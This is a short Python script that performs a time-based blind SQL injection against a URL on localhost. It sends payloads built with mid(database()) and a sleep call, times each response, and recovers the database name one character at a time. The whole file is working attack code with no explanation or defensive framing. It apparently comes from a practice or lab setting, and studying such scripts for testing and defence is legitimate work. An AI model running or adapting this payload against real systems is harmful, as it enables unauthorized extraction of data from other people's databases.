import requests
import os
import string
import sys
import collections
import time
from itertools import product


sleep = 3
dic_chars = string.digits + string.ascii_letters
stt = ''
numm = 1
dic = string.ascii_letters
url_ = """http://localhost/?id=1'"""
for a in range(5):
    for i in dic:
        pay = """ Or(if(mid(database(),1,%d)='%s%c',slEep(5),0))+--+""" % (numm, stt, i)
        url = url_ + pay
        start = time.time()
        r = requests.post(url)
        stop = time.time()
        if stop - start > 5:
            stt +=i
            numm = numm + 1
            print("str=",stt, "target url=",url)
            
